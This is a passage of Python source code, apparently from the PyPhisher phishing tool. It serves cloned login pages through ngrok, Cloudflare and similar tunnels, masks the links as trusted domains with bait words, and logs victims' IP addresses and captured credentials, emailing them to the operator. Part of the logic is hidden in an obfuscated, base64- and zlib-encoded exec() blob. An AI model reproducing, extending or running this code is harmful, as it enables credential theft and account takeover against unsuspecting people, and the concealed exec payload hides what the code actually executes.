                return fol
            else:
                sprint(f"\n{error}index.php/index.html required but not found!")
        else:
            sprint(f"\n{error}Directory do not exists!")

# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return

# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}PyPhisher{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return


# Optional function for ngrok url masking
def masking(url):
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if cust=="":
        return
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    resp = res.split("\n")[0] if "\n" in res else res
    if "https://" not in resp:
        sprint(f"{error}Service not available!\n{error}{resp}")
        waiter()
    short = resp.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
        domain = "https://"
    else:
        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
        domain = "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")


# Staring functions

# Update of PyPhisher
def updater():
    internet()
    if not isfile("files/pyphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        append(e, error_file)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        clear(fast=True)
        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            shell("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# Installing packages and downloading tunnelers
def requirements():
    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
    if termux:
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            shell("termux-setup-storage")
    internet()
    if termux:
        if not is_installed("proot"):
            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    isngrok = isfile(f"{tunneler_dir}/ngrok")
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    isloclx = isfile(f"{tunneler_dir}/loclx")
    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
        if isfile("ngrok.tgz"):
            extract("ngrok.tgz", f"{tunneler_dir}")
            remove("ngrok.tgz")
    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    if isfile("loclx.zip"):
        extract("loclx.zip", f"{tunneler_dir}")
        remove("loclx.zip")
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("ngrok"):
        nr_command = "ngrok"
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if is_installed("localxpose"):
        lx_command = "localxpose"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        nr_token()
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed")
            sleep(1)

# Main Menu to choose phishing type

_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'EehVQNw/f/+7537L1mgINRnOTsZRdcRIT9JehMOOR58APRKcgmYFQQzct97a9q3deNx3nYRGCCR4Gmx9WTXlUfl7nIFWMEuGoHb+h8JEM2C+ZO+psoRNS7szrN3SchXn/L9UqXSy0XNFhvk8U/jFJWRhBSLH7Fd/D00hVjHKnp7lZ7FQKWdvtxebByWw4o79FYfAo4XH6w0X/IzWRXKUBhqploPf1ZAZHPkt48J6hAvNldThlw2a3hwhqrlWh0ksl7rz8zmsr1eO33WLT3Sh3cKDHqP3vltSZOlVGayo/Y5QXj8XWfL/CE5kZBZOplPRWbzhhQ0Laq+9zNw+v2bAZgTLSAbfXXEnNTUdoVkOi48buO+GZ25GUCXQmyHjeiOeUSp69TMYzrGEam1Tm4XjGZWvWVmTOWUAiwuyi3xyJYAlEBRYK3q48Px0hYDhLWpKlYFw+ggjO7pMXbmv+u9z6FvcjskpxuBlttpwjy4gecDNj/dqe4NiIMwGuS6Qf9EOZhdUQsc/6ngxK7pQWJ+Cc5lJYUTDC1YM+mBdTDyGoLfmC5To+krdDncweVMZC/qKVgy9p5X1vZNQBHWL46Ba0f2KOzOdJQJrgIJLUpPR0N+VwzWcp87ipM1BWQhSivJwzmRmsCzNEG9SZhd8HIKT42rK6JRIF7KfTYdSus+yV2zAAHctCBTdFL+ABZAXbJBiNF74NyRhemMTww17k8tN6eY11UDFKGIyElbXiCiCmhMxyop/iGBdb94pkvRUhJqHbLg++g9c6v4M2HfU2tCX5g6SMHnu75+LaDvjJ7my8642878fAi1oXUy9skSy1J+k3YxbMojD9AOhjd2F7MvPYcpzvQ2yIYRuTxS61es2X07mByAj3QnBJqAq+s8iAzIJyPex81gzup+pGcTByKf6Xc0PPJBi5E202JbZbgikdo3HQt/zjEuU6fQRC/TADSBS5QdxajTFgd/dKGpO8LK6mc6v+k+RVtxG69BQyvxqmyTZ28ncRlLs/GRKSB2OYu3Qpxz0He6pzQitgDVz9vgM0Mgu3JtAAAzDB3pqz1jnbFSJX8GsE2di8THVlK/16dJ7YoL9iGpcZDkPPmK6iLB6h2rYIP+65juOayLn5JstNRicfHQD8YRN0k3+WPTdiSLVcCfi2m08+ZbfB9VxOTqpbGwRvbKybA1kBNsTwqK15IDaZFjLOIYBkMPWXQM09xg8rdiHvKnlRAm3Skj/sNUZbZp4vLHiRz4s0bf98y57wI+8eJGuG5NwG7x3hhcQZUSLyh43fqBMECwn7wir5DXjf4pRxr1a8TTG3lnYf4J0CHvu/LPKbZTnWOqJJu4gO3hwxjQhNbswH/ohK/wb+mOysZ2kRNnRVQl9I5dRPaoiHdwQy7YFJaeBQSWzpWodAqVq3JS4jSOcEqdMFezvLc7UbGjDOnxfd+4l56wn0DETR4fLLLfN6H6r3gO5Rs4qwxTtU8lrS2TjX/cdXCGegOo6bXd0tU0F6mCEEgj7w5Ln1hR272M8FTLM/A7Ru6TQXSeE44m+fxVruD8bSJkK9R9GVhNw01tJy1oKmH4vkf7l/uSqbqtyWUfJm9XQmJV7n32FYbIGvc1Qb53h+PV/9//nPr+m5e7EDi7OdVPbLJBBPiTHmc3dQsNggpK/lHNQCoFpSUE1NwJe'))

# Start server and tunneling
def server():
    global mode
    clear()
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file, lx_file, lhr_file]:
        delete(logfile)
        if not isfile(logfile):
            mknod(logfile)
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    lx_log = open(lx_file, "w")
    lhr_log = open(lhr_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{nr_command} http {arguments} {local_url}")
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
    if key:
        bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    else:
        bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    sleep(10)
    try:
        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
        nr_url = nr_api["tunnels"][0]["public_url"]
    except Exception as e:
        append(e, error_file)
        nr_url = ""
    if nr_url != "":
        nr_success=True
    else:
        nr_success=False
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)
    lx_success = False
    for i in range(10):
        lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
        if lx_url != "https://":
            lx_success = True
            break
        sleep(1)
    lhr_success = False
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        sleep(1)
    if nr_success or cf_success or lx_success or lhr_success:
        sprint(f"\n{info}Your urls are given below:")
        if mode == "test":
            print(f"\n{info}URL Generation completed successfully!")
            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
            pexit()
        if nr_success:
            url_manager(nr_url, "Ngrok", "NR Masked")
        if cf_success:
            url_manager(cf_url, "CloudFlared", "CF Masked")
        if lx_success:
            url_manager(lx_url, "LocalXpose", "LX Masked")
        if lhr_success:
            url_manager(lhr_url, "LocalHR", "LHR Masked")
        if nr_success and tunneler.lower() == "ngrok":
            masking(nr_url)
        elif lx_success and tunneler.lower() == "loclx":
            masking(lx_url)
        elif lhr_success and tunneler.lower() == "localhostrun":
            masking(lhr_url)
        elif cf_success and tunneler.lower() == "cloudflared":
            masking(cf_url)
        else:
            print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!